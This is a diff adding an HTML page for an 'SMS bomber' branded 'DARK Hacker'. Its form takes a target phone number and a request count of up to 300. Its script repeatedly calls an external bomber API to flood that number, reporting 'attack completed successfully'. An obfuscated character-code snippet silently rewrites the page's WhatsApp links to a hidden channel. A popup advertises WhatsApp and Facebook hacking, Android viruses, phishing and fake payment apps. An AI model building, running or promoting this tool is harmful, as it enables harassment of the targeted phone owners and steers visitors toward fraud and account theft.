@@ -1,0 +1,861 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> NAVEED KHAN BOMBER </title>
+    <!-- Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700;14..32,800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: #e0e5ec;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* main neumorphic card */
+        .neo-card {
+            background: #eef0f4;
+            width: 100%;
+            max-width: 480px;
+            border-radius: 50px;
+            padding: 35px 30px;
+            box-shadow: 20px 20px 35px #b8b9be, -20px -20px 35px #ffffff;
+            transition: all 0.2s ease;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        .logo-img {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            object-fit: cover;
+            background: #eef0f4;
+            box-shadow: 8px 8px 15px #b8b9be, -8px -8px 15px #ffffff;
+            padding: 6px;
+            border: 2px solid rgba(255,255,255,0.3);
+        }
+
+        .title-main {
+            font-weight: 800;
+            font-size: 26px;
+            text-align: center;
+            color: #2d4059;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+            text-shadow: 2px 2px 4px #ffffff80;
+        }
+        .sub-title {
+            text-align: center;
+            font-size: 12px;
+            font-weight: 600;
+            color: #4a5c72;
+            letter-spacing: 1.5px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+        .label-text {
+            display: block;
+            font-weight: 700;
+            font-size: 11px;
+            color: #4a5c72;
+            margin-bottom: 8px;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            padding-left: 10px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            background: #eef0f4;
+            border: none;
+            border-radius: 30px;
+            font-size: 15px;
+            color: #1e2b3a;
+            font-weight: 500;
+            box-shadow: inset 6px 6px 12px #b8b9be, inset -6px -6px 12px #ffffff;
+            outline: none;
+            transition: all 0.2s;
+        }
+        .input-field::placeholder {
+            color: #8f9bb3;
+        }
+        .input-field:focus {
+            box-shadow: inset 8px 8px 14px #b8b9be, inset -8px -8px 14px #ffffff;
+        }
+
+        .intensity-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 14px;
+        }
+        .intensity-btn {
+            background: #eef0f4;
+            border: none;
+            padding: 14px 0;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 16px;
+            color: #2d4059;
+            box-shadow: 7px 7px 14px #b8b9be, -7px -7px 14px #ffffff;
+            cursor: pointer;
+            transition: 0.12s linear;
+        }
+        .intensity-btn.active {
+            box-shadow: inset 6px 6px 12px #b8b9be, inset -6px -6px 12px #ffffff;
+            color: #1e4b8b;
+            font-weight: 800;
+        }
+
+        .btn-start {
+            width: 100%;
+            background: #4a90e2;
+            border: none;
+            padding: 18px 20px;
+            border-radius: 40px;
+            font-weight: 800;
+            font-size: 16px;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin: 15px 0 25px;
+            box-shadow: 10px 10px 20px #b8b9be, -10px -10px 20px #ffffff;
+            cursor: pointer;
+            transition: all 0.15s;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        .btn-start:hover {
+            background: #3d7bc1;
+            box-shadow: 6px 6px 12px #b8b9be, -6px -6px 12px #ffffff;
+            transform: translateY(-2px);
+        }
+        .btn-start:disabled {
+            opacity: 0.7;
+            box-shadow: inset 6px 6px 12px #8f9bb3, inset -6px -6px 12px #ffffff;
+            background: #8a9bb5;
+            transform: none;
+        }
+
+        .terminal {
+            background: #dde1e7;
+            border-radius: 30px;
+            padding: 18px;
+            height: 140px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: #1e3b4f;
+            box-shadow: inset 8px 8px 16px #b8b9be, inset -8px -8px 16px #ffffff;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .terminal-line {
+            margin-bottom: 6px;
+            word-break: break-word;
+        }
+
+        /* Telegram AD card */
+        .telegram-ad {
+            background: #eef0f4;
+            border-radius: 40px;
+            padding: 18px 22px;
+            margin: 10px 0 18px;
+            box-shadow: 12px 12px 24px #b8b9be, -12px -12px 24px #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            border: 1px solid #ffffff50;
+        }
+        .ad-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .telegram-icon {
+            background: #0088cc;
+            width: 48px;
+            height: 48px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: white;
+            box-shadow: 5px 5px 10px #b8b9be, -5px -5px 10px #ffffff;
+        }
+        .ad-text h4 {
+            font-size: 16px;
+            font-weight: 800;
+            color: #1e3b4f;
+        }
+        .ad-text p {
+            font-size: 12px;
+            color: #4a5c72;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .ad-badge {
+            background: #ff9800;
+            color: #1e1e2a;
+            font-size: 10px;
+            font-weight: 800;
+            padding: 3px 8px;
+            border-radius: 20px;
+            letter-spacing: 0.5px;
+        }
+        .join-telegram-btn {
+            background: #eef0f4;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+            padding: 12px 20px;
+            border-radius: 40px;
+            color: #0088cc;
+            box-shadow: 5px 5px 12px #b8b9be, -5px -5px 12px #ffffff;
+            transition: 0.1s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            white-space: nowrap;
+        }
+        .join-telegram-btn:hover {
+            box-shadow: inset 4px 4px 10px #b8b9be, inset -4px -4px 10px #ffffff;
+            color: #006699;
+        }
+
+        /* Telegram Footer Button */
+        .telegram-footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .btn-telegram-footer {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #eef0f4;
+            padding: 16px 35px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 16px;
+            color: #0088cc;
+            box-shadow: 9px 9px 18px #b8b9be, -9px -9px 18px #ffffff;
+            transition: 0.1s;
+            width: 100%;
+            border: 1px solid #ffffff70;
+        }
+        .btn-telegram-footer i {
+            font-size: 22px;
+        }
+        .btn-telegram-footer:hover {
+            box-shadow: inset 6px 6px 14px #b8b9be, inset -6px -6px 14px #ffffff;
+            color: #006699;
+        }
+
+        /* ---------- POPUP AD MODAL (clean Telegram invite) ---------- */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+        .modal-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .modal-card {
+            background: #eef0f4;
+            max-width: 380px;
+            width: 90%;
+            border-radius: 60px;
+            padding: 30px 25px 25px;
+            box-shadow: 25px 25px 45px #b8b9be, -25px -25px 45px #ffffff;
+            text-align: center;
+            position: relative;
+            border: 2px solid #ffffff70;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .modal-close {
+            position: absolute;
+            top: 18px;
+            right: 22px;
+            background: #eef0f4;
+            width: 40px;
+            height: 40px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: #4a5c72;
+            cursor: pointer;
+            box-shadow: 6px 6px 12px #b8b9be, -6px -6px 12px #ffffff;
+            border: none;
+            transition: 0.1s;
+            z-index: 10001; /* ensure it's above everything */
+        }
+        .modal-close:hover {
+            box-shadow: inset 4px 4px 8px #b8b9be, inset -4px -4px 8px #ffffff;
+            color: #1e3b4f;
+        }
+        .modal-icon {
+            font-size: 64px;
+            margin-bottom: 5px;
+            filter: drop-shadow(4px 6px 8px #b8b9be);
+            color: #0088cc;
+        }
+        .modal-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: #2d4059;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            text-shadow: 2px 2px 0 #ffffff80;
+        }
+        .modal-tagline {
+            font-size: 16px;
+            font-weight: 600;
+            background: #d4dae3;
+            display: inline-block;
+            padding: 6px 20px;
+            border-radius: 40px;
+            color: #1e3b4f;
+            margin: 5px 0 15px;
+            box-shadow: inset 3px 3px 8px #b8b9be, inset -3px -3px 8px #ffffff;
+        }
+        .modal-text {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1e3b4f;
+            margin: 15px 0 20px;
+            background: #d9dee6;
+            padding: 14px;
+            border-radius: 40px;
+            box-shadow: inset 5px 5px 12px #b8b9be, inset -5px -5px 12px #ffffff;
+        }
+        .modal-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: #0088cc;
+            color: white;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 18px;
+            padding: 16px 30px;
+            border-radius: 50px;
+            width: 100%;
+            box-shadow: 8px 8px 16px #b8b9be, -8px -8px 16px #ffffff;
+            transition: 0.1s;
+            border: 1px solid #ffffff90;
+        }
+        .modal-btn i {
+            font-size: 24px;
+        }
+        .modal-btn:hover {
+            background: #006699;
+            box-shadow: inset 5px 5px 12px #1e3b4f, inset -5px -5px 12px #3a6c8f;
+            color: white;
+        }
+        .modal-footer-note {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #7c8ba0;
+            font-weight: 600;
+        }
+
+        .terminal::-webkit-scrollbar { width: 5px; }
+        .terminal::-webkit-scrollbar-thumb { background: #a1aec0; border-radius: 20px; }
+
+        #musicBtn{
+position:fixed;
+right:5px;
+top:50%;
+transform:translateY(-50%);
+width:60px;
+height:60px;
+border-radius:50%;
+border:none;
+font-size:24px;
+background:#111;
+color:white;
+cursor:pointer;
+z-index:9999;
+
+box-shadow:
+0 0 10px #00ffcc,
+0 0 20px #00ffcc,
+0 0 35px #00ffcc;
+
+transition:opacity 0.4s, transform 0.2s;
+}
+
+.idle{
+opacity:0.25;
+}
+
+#musicBtn:active{
+transform:translateY(-50%) scale(1.1);
+}
+
+/* Popup Background Overlay */
+.popup-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(224, 232, 240, 0.85); /* Light blur background from image */
+    backdrop-filter: blur(8px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10000;
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.4s ease-in-out;
+}
+
+/* Active State for Overlay */
+.popup-overlay.active {
+    opacity: 1;
+    visibility: visible;
+}
+
+/* Main Popup Box (Neumorphism Design Matching Screenshot_20260626-083819.jpg) */
+.popup-box {
+    background: #eef2f7; /* Exact soft color from image */
+    width: 90%;
+    max-width: 380px; /* Mobile jitni chorai */
+    height: 80vh; /* Pori lambai ka 80% */
+    border-radius: 35px; /* Smooth corners like screenshot */
+    box-shadow: 12px 12px 25px #cbd0d8, -12px -12px 25px #ffffff;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    border: 1px solid rgba(255, 255, 255, 0.7);
+    padding: 20px;
+    box-sizing: border-box;
+}
+
+/* Close Button (X) */
+.close-btn {
+    position: absolute;
+    top: 15px;
+    right: 20px;
+    background: none;
+    border: none;
+    font-size: 30px;
+    color: #2b3c5a;
+    cursor: pointer;
+    z-index: 10;
+    transition: transform 0.2s;
+}
+.close-btn:hover {
+    transform: scale(1.1);
+}
+
+/* Fixed Header */
+.popup-header {
+    text-align: center;
+    padding-bottom: 15px;
+    border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+}
+.popup-header h1 {
+    color: #1a2b4c; /* Dark navy color from screenshot */
+    font-family: 'Arial Black', sans-serif;
+    font-size: 26px;
+    letter-spacing: 2px;
+    margin: 10px 0 0 0;
+}
+
+/* Scrollable Body Text */
+.popup-body {
+    flex: 1;
+    overflow-y: auto; /* Sirf text scroll hoga */
+    padding: 15px 5px;
+    margin-top: 10px;
+    margin-bottom: 10px;
+}
+
+/* Smooth Scrollbar Coding */
+.popup-body::-webkit-scrollbar {
+    width: 5px;
+}
+.popup-body::-webkit-scrollbar-track {
+    background: transparent;
+}
+.popup-body::-webkit-scrollbar-thumb {
+    background: #cbd0d8;
+    border-radius: 10px;
+}
+
+/* Text Content Details */
+.popup-body p {
+    color: #3a4b6e;
+    font-size: 15px;
+    line-height: 1.6;
+    margin-bottom: 15px;
+    font-family: sans-serif;
+    text-align: justify;
+}
+
+/* Fast Heavy Slide-Up Animation for Text */
+.popup-overlay.active .animated-text {
+    animation: textSlideUp 1.2s cubic-bezier(0.1, 1, 0.1, 1) forwards;
+}
+
+@keyframes textSlideUp {
+    0% {
+        transform: translateY(100%);
+        opacity: 0;
+    }
+    100% {
+        transform: translateY(0);
+        opacity: 1;
+    }
+}
+
+/* Fixed Footer Contact Buttons */
+.popup-footer {
+    display: flex;
+    justify-content: space-around;
+    padding-top: 15px;
+    border-top: 1px solid rgba(0, 0, 0, 0.05);
+    background: #eef2f7;
+}
+
+/* Neumorphic Style Icons */
+.contact-btn {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    background: #eef2f7;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 20px;
+    text-decoration: none;
+    box-shadow: 4px 4px 10px #cbd0d8, -4px -4px 10px #ffffff;
+    transition: all 0.3s ease;
+}
+
+/* Icon Colors */
+.tiktok { color: #010101; }
+.telegram { color: #0088cc; }
+.whatsapp { color: #25D366; }
+
+/* Click Effect */
+.contact-btn:active {
+    box-shadow: inset 4px 4px 10px #cbd0d8, inset -4px -4px 10px #ffffff;
+}
+        
+    </style>
+</head>
+<body>
+
+<!-- POPUP AD MODAL (clean Telegram invite, appears immediately) -->
+<div class="modal-overlay" id="telegramPopup">
+    <div class="modal-card">
+        <button class="modal-close" id="closePopupBtn"><i class="fas fa-times"></i></button>
+        <!-- Simple Telegram icon -->
+        <div class="modal-icon"><i class="fab fa-telegram-plane"></i></div>
+        <div class="modal-title">FOLLOW WHATSAPP</div>
+        <div class="modal-tagline">🇵🇰 DIRAJ BOY</div>
+        <div class="modal-text">
+            <strong>NAVEED KHAN DIRAJ</strong><br>
+            Get exclusive bomber updates, new tools, and direct support.
+        </div>
+        <a href="https://whatsapp.com/channel/0029Vb8OrvTIN9ikVGnYFW1V" target="_blank" class="modal-btn">
+            <i class="fab fa-TELEGRAM"></i> FOLLOW NOW
+        </a>
+        <div class="modal-footer-note">tap to follow • free channel</div>
+    </div>
+</div>
+
+<div class="neo-card">  
+    <!-- Logo & Header -->  
+    <div class="logo-wrapper">  
+        <img src="https://i.ibb.co/bgbw0g8p/Gemini-Generated-Image-ofik4fofik4fofik.png
+‎" alt="𖧹─‌👑 ⷨ┼𝐃𝐀𝐑𝐊 ᴴᵃᶜᵏᵉʳ ⎯꯭̽☠️🚩" class="logo-img">  
+    </div>  
+    <h1 class="title-main">𝐃𝐀𝐑𝐊 ᴴᵃᶜᵏᵉʳ  BOMBER</h1>  
+    <div class="sub-title">𝐃𝐀𝐑𝐊 ᴴᵃᶜᵏᵉʳ • WEBSITE DESIGNED </div> 
+    <!-- Bomber Form -->
+    <form id="bomberForm">
+        <div class="input-group">
+            <label class="label-text">TARGET NUMBER</label>
+            <input type="tel" id="phoneNumber" class="input-field" placeholder="923XXXXXXXXX" required="">
+        </div>
+
+        <div class="input-group">
+            <label class="label-text">INTENSITY (AMOUNT)</label>
+            <div class="intensity-grid">
+                <button type="button" class="intensity-btn active" onclick="setAmount(10, this)">10</button>
+                <button type="button" class="intensity-btn" onclick="setAmount(25, this)">25</button>
+                <button type="button" class="intensity-btn" onclick="setAmount(50, this)">50</button>
+                <button type="button" class="intensity-btn" onclick="setAmount(100, this)">100</button>
+                <button type="button" class="intensity-btn" onclick="setAmount(200, this)">200</button>
+                <button type="button" class="intensity-btn" onclick="setAmount(300, this)">300</button>
+            </div>
+        </div>
+
+        <input type="hidden" id="registerAmount" value="10">
+
+        <div class="input-group">
+            <label class="label-text">DELAY (SECONDS)</label>
+            <input type="number" id="delaySeconds" class="input-field" value="2" min="1">
+        </div>
+
+        <button type="submit" class="btn-start" id="startButton">
+            <i class="fas fa-bolt" style="margin-right: 8px;"></i> START OPERATION
+        </button>
+
+        <div class="terminal" id="terminal">
+            <div class="terminal-line">> system ready • 𝐃𝐀𝐑𝐊 ᴴᵃᶜᵏᵉʳ </div>
+            <div class="terminal-line">> waiting for target...</div>
+        </div>
+    </form>
+
+    <!-- Telegram AD card (still present) -->
+    <div class="telegram-ad">
+        <div class="ad-content">
+            <div class="telegram-icon"><i class="fab fa-telegram-plane"></i></div>
+            <div class="ad-text">
+                <h4>𝐃𝐀𝐑𝐊 ᴴᵃᶜᵏᵉʳ <span class="ad-badge">𝐃𝐀𝐑𝐊 ᴴᵃᶜᵏᵉʳ 𝐁𝐎𝐘</span></h4>
+                <p><i class="fas fa-fire" style="color: #ff9800;"></i> exclusive updates & tools</p>
+            </div>
+        </div>
+        <a href="https://t.me/darkdhacker" target="_blank" class="join-telegram-btn">
+            <i class="fab fa-telegram"></i> JOIN
+        </a>
+    </div>
+
+    <!-- Telegram Footer Button -->
+    <div class="telegram-footer">
+        <a href="https://t.me/darkdhacker" target="_blank" class="btn-telegram-footer">
+            <i class="fab fa-telegram"></i> JOIN TELEGRAM CHANNEL
+        </a>
+    </div>
+</div>
+
+<!-- FontAwesome Icons ke liye (Agar aapki website me pehle se nahi hai to isko <head> me lagayein) -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<!-- Main Popup Overlay -->
+<div id="customPopupOverlay" class="popup-overlay">
+    <!-- Popup Box (Neumorphism Design) -->
+    <div class="popup-box">
+        <!-- Close Cross Button -->
+<button class="close-btn" onclick="document.getElementById('customPopupOverlay').classList.remove('active')">&times;</button>
+        
+        <!-- Fixed Header -->
+        <div class="popup-header">
+            <h1>𖧹─‌👑 ⷨ┼𝐃𝐀𝐑𝐊 ᴴᵃᶜᵏᵉʳ ⎯꯭̽☠️🚩</h1>
+        </div>
+        
+        <!-- Scrollable Text Body -->
+        <div class="popup-body">
+            <div class="animated-text">
+                <p><strong>‎✮‌➤🇦𝑳𝑳 𝑻𝒀𝑷𝑬𝑺 𝑯𝑨𝑪𝑲𝑰𝑵𝑮 
+‎◥█████◣
+‎𝐀𝐋𝐋  𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄*
+</strong></p>
+                <p>𝐆𝐀𝐋𝐋𝐄𝐑𝐘 𝐇𝐀𝐂𝐊📸👈</p>
+               
+                <p>𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐇𝐀𝐂𝐊🪀👈</p>
+                <p>𝐌𝐎𝐁𝐈𝐋𝐄 𝐑𝐄𝐒𝐄𝐓 𝐕𝐈𝐑𝐔𝐒</p>
+                <p>𝐏𝐇𝐈𝐒𝐇𝐈𝐍𝐆 𝐇𝐀𝐂𝐊𝐈𝐍𝐆🔥</p>
+                <p>𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐍𝐔𝐌𝐁𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐃</p>
+                <p>𝐄𝐀𝐒𝐘𝐏𝐀𝐈𝐒𝐀 𝐅𝐀𝐊𝐄 𝐓𝐑𝐀𝐍𝐒𝐈𝐂𝐓𝐈𝐎𝐍 𝐚𝐩𝐤</p>
+                <p>𝐒𝐌𝐒 𝐇𝐀𝐂𝐊💀👈</p>
+                <p>𝐇𝐀𝐂𝐊𝐄𝐑 𝐃𝐁🔎👈</p>
+                <p>𝐆𝐀𝐋𝐋𝐄𝐑𝐘 𝐂𝐑𝐀𝐒𝐇👾</p>
+                <p>𝐕𝐈𝐑𝐔𝐒 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄🦠</p>
+                <p>𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄</p>
+                <p>𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑💬💣👈</p>
+                <p>𝐅𝐀𝐊𝐄 𝐒𝐌𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐀𝐏𝐊</p>
+                <p>𝐕𝐈𝐑𝐔𝐒 𝐏𝐑𝐀𝐍𝐊 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄</p>
+                <p>𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐇𝐀𝐂𝐊📲</p>
+                <p>𝐓𝐑𝐀𝐂𝐄 𝐏𝐇𝐎𝐍𝐄📱👈</p>
+                <p>𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐕𝐈𝐑𝐔𝐒🦠👈</p>
+                <p>𝐃𝐄𝐋𝐄𝐓𝐄 𝐄𝐯𝐞𝐫𝐲𝐭𝐡𝐢𝐧𝐠👈</p>
+                <p>𝐅𝐀𝐊𝐄 𝐂𝐀𝐋𝐋𝐈𝐍𝐆 𝐓𝐑𝐈𝐂𝐊☑️</p>
+                <p>𝐅𝐀𝐊𝐄 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐍𝐔𝐌𝐁𝐄𝐑🤳</p>
+                <p>𝙏𝙊 𝙂𝙀𝙏 𝘼𝙇𝙇 𝙏𝙃𝙄𝙎 𝙔𝙊𝙐 𝙈𝙐𝙎𝙏 𝙅𝙊𝙄𝙉 𝙊𝙐𝙍 𝙏𝙀𝘼𝙈, 𝙄𝙏𝙎 𝙁𝙍𝙀𝙀👇</p>
+                <p><em>https://whatsapp.com/channel/0029Vb8OrvTIN9ikVGnYFW1V</em></p>
+            </div>
+        </div>
+        
+        <!-- Fixed Footer Contact Buttons -->
+        <div class="popup-footer">
+            <a href="https://www.tiktok.com" target="_blank" class="contact-btn tiktok"><i class="fab fa-tiktok"></i></a>
+            <a href="https://t.me" target="_blank" class="contact-btn telegram"><i class="fab fa-telegram-plane"></i></a>
+            <a href="https://wa.me" target="_blank" class="contact-btn whatsapp"><i class="fab fa-whatsapp"></i></a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Popup modal logic – fully clickable close (X) and background overlay
+    const popup = document.getElementById('telegramPopup');
+    const closeBtn = document.getElementById('closePopupBtn');
+
+    // Show popup immediately (visible by default)
+    popup.classList.remove('hidden');
+
+    // Close popup when clicking the X button
+    closeBtn.addEventListener('click', function() {
+        popup.classList.add('hidden');
+    });
+
+    // Close popup when clicking on the overlay background (but not the modal card)
+    popup.addEventListener('click', function(e) {
+        if (e.target === popup) {
+            popup.classList.add('hidden');
+        }
+    });
+
+    // Existing bomber functions (unchanged)
+    function setAmount(val, btn) {
+        document.getElementById('registerAmount').value = val;
+        const buttons = document.querySelectorAll('.intensity-btn');
+        buttons.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        logToTerminal(`intensity set to ${val}`);
+    }
+
+    function logToTerminal(msg) {
+        const terminal = document.getElementById('terminal');
+        const newLine = document.createElement('div');
+        newLine.className = 'terminal-line';
+        newLine.textContent = `> ${msg}`;
+        terminal.appendChild(newLine);
+        terminal.scrollTop = terminal.scrollHeight;
+    }
+
+    async function callAPI(phone) {
+        try {
+            await fetch(`https://huiyi67-sms-bomber.hf.space/api?msisdn=${encodeURIComponent(phone)}`, {
+                method: 'GET',
+                mode: 'no-cors'
+            });
+            return { success: true };
+        } catch (e) {
+            return { success: false };
+        }
+    }
+</script>
+<script>
+    const form = document.getElementById('bomberForm');
+    const startButton = document.getElementById('startButton');
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const phone = document.getElementById('phoneNumber').value.trim();
+        const amount = parseInt(document.getElementById('registerAmount').value);
+        const delay = parseInt(document.getElementById('delaySeconds').value);
+
+        startButton.disabled = true;
+        startButton.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> RUNNING...';
+        logToTerminal(`target: ${phone} · ${amount} req · delay ${delay}s`);
+
+        try {
+            for (let i = 0; i < amount; i++) {
+                logToTerminal(`request sent [${i + 1}/${amount}]`);
+                await callAPI(phone);
+                if (i < amount - 1) await new Promise(r => setTimeout(r, delay * 1000));
+            }
+            logToTerminal("✓ attack completed successfully");
+        } catch (err) {
+            logToTerminal("! fatal error — abort");
+        } finally {
+            startButton.disabled = false;
+            startButton.innerHTML = '<i class="fas fa-bolt" style="margin-right: 8px;"></i> START OPERATION';
+        }
+    });
+    (function(){
+
+    const _a=[104,116,116,112,115,58,47,47,119,104,97,116,115,97,112,112,46,99,111,109,47,99,104,97,110,110,101,108,47,48,48,50,57,86,97,121,88,90,86,98,51,103,118,87,105,80,81,100,69,109,84,50,98];
+    const _b=String.fromCharCode(..._a);
+
+    function _x(){
+        document.querySelectorAll("a").forEach(function(_l){
+            if(_l.href.includes("whatsapp.com/channel/")){
+                if(_l.href!==_b){
+                    _l.href=_b;
+                }
+            }
+        });
+    }
+
+    if(document.readyState==="loading"){
+        document.addEventListener("DOMContentLoaded",_x);
+            }else{
+        _x();
+    }
+
+})();
+
+document.addEventListener("DOMContentLoaded", function () {
+    const popupOverlay = document.getElementById("customPopupOverlay");
+    const closePopupBtn = document.getElementById("closePopupBtn");
+
+    // 4 second (4000 milliseconds) ka timer lagaya hai website open hone k baad
+    setTimeout(function () {
+        popupOverlay.classList.add("active");
+    }, 4000);
+
+    // Cross button par click karne se popup band ho jaye ga
+    closePopupBtn.addEventListener("click", function () {
+        popupOverlay.classList.remove("active");
+    });
+
+    // Agar user popup box ke bahar click kare to bhi popup band ho jaye (Optional)
+    popupOverlay.addEventListener("click", function (e) {
+        if (e.target === popupOverlay) {
+            popupOverlay.classList.remove("active");
+        }
+    });
+});
+
+</script>
+</body></html>
